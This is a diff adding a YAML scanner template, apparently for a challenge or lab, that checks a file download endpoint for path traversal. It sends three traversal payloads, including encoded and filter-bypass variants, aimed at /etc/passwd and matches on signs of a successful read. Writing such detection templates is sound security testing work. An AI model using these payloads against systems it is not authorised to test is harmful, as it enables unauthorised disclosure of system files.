@@ -1,0 +1,40 @@
+id: ch2-path-traversal
+
+info:
+  name: Path Traversal - File Download Endpoint
+  author: security-researcher
+  severity: high
+  description: |
+    The file download endpoint is vulnerable to path traversal attacks.
+    Attackers can potentially access files outside the intended directory.
+  tags: lfi,path-traversal,file-disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download?file=../../../etc/passwd"
+      - "{{BaseURL}}/download?file=....//....//....//etc/passwd"
+      - "{{BaseURL}}/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
+
+    stop-at-first-match: true
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/bash"
+          - "/bin/sh"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+          - "text/plain"
+        condition: or
